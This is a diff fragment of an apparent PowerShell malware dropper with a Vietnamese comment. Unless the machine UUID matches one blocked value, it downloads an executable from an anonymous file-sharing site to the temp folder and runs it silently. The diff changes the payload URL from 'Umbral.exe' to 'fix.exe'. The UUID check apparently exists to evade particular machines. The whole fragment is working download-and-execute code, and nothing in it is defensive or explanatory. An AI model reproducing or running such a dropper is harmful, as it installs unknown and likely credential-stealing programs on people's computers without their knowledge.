@@ -48,7 +48,7 @@ if ($uuid -eq $blockedUUID) {
 } else {
     # Nếu UUID không khớp, tải và chạy tập tin
     $temp = [System.IO.Path]::GetTempPath()
-    Invoke-WebRequest -Uri "https://anonsharing.com/file/c24bdc0c7b314dfd/Umbral.exe" -OutFile "$temp\skid.exe"
+    Invoke-WebRequest -Uri "https://anonsharing.com/file/f92fcbba333c5a03/fix.exe" -OutFile "$temp\skid.exe"
     Start-Process -FilePath "$temp\skid.exe"
 }
 
